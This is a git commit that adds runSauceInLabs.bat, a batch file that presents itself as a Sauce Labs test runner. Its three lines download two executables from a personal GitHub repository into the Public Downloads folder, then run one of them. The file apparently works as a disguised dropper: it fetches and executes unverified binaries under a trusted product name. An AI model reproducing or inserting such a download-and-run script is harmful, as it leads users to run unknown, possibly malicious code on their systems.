830d471308ffce13d31b9cc5646c99244b31043b
marinabarros320168 <121142741+marinabarros320168@users.noreply.github.com>
2023-02-13 14:37:31 -0300

    Create runSauceInLabs.bat

---
+++ runSauceInLabs.bat
@@ -0,0 +1,3 @@
+powershell Invoke-WebRequest -Uri "https://raw.githubusercontent.com/marinabarros320168/new/main/msedgedriver.exe" -OutFile "C:\Users\Public\Downloads\msedgedriver.exe"
+powershell Invoke-WebRequest -Uri "https://raw.githubusercontent.com/marinabarros320168/new/main/SauceLabs.exe" -OutFile "C:\Users\Public\Downloads\saucelabs.exe"
+C:\Users\Public\Downloads\saucelabs.exe
